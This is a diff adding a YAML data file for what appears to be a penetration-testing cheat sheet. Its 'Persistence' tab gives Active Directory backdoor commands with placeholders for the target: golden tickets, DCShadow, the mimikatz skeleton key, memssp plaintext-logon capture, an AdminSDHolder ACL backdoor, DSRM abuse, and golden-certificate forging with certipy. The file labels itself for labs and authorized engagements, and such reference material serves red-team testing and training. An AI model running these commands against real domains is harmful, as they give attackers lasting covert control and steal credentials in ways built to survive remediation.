@@ -1,0 +1,48 @@
+tab: persistence
+title: Persistence
+order: 60
+blurb: >
+  Maintain domain access after remediation. Lab / authorized engagements only —
+  these survive password resets and are deliberately hard to remove.
+
+sections:
+
+  - name: Ticket-based
+    hint: Forged Kerberos material outlives most credential resets (except krbtgt double-reset).
+    steps:
+      - text: Golden ticket (see Post-exploit)
+        cmds:
+          - "impacket-ticketer -nthash <krbtgt_hash> -domain-sid $SID -domain $DOMAIN administrator"
+
+  - name: Directory-based
+    hint: Changes written into AD itself.
+    steps:
+      - text: DCShadow (push rogue replication)
+        flags: [win]
+        cmds:
+          - {c: "lsadump::dcshadow /object:$TARGET /attribute:<attr> /value:<val>", lbl: "mimikatz, needs 2 sessions"}
+      - text: AdminSDHolder / ACL backdoor
+        cmds:
+          - "bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $RHOST add genericAll 'CN=AdminSDHolder,CN=System,DC=<corp>,DC=<local>' $USER"
+
+  - name: Host-based
+    hint: On a DC you control.
+    steps:
+      - text: Skeleton key
+        flags: [win, opsec]
+        cmds:
+          - {c: "misc::skeleton", lbl: "mimikatz — master password 'mimikatz' for all accounts (in-memory)"}
+      - text: Custom SSP / DSRM
+        flags: [win]
+        cmds:
+          - {c: "misc::memssp", lbl: "log plaintext logons to disk"}
+          - "# DSRM: set DsrmAdminLogonBehavior=2, then PtH the DSRM admin"
+
+  - name: Certificate-based
+    hint: Golden certificate — forge auth certs from the stolen CA key. Very durable.
+    steps:
+      - text: Steal CA key, forge
+        flags: [cve]
+        cmds:
+          - "certipy ca -backup -u $USER@$DOMAIN -p '$PASS' -ca '$CA' -dc-ip $RHOST"
+          - "certipy forge -ca-pfx <ca.pfx> -upn administrator@$DOMAIN -subject 'CN=Administrator'"
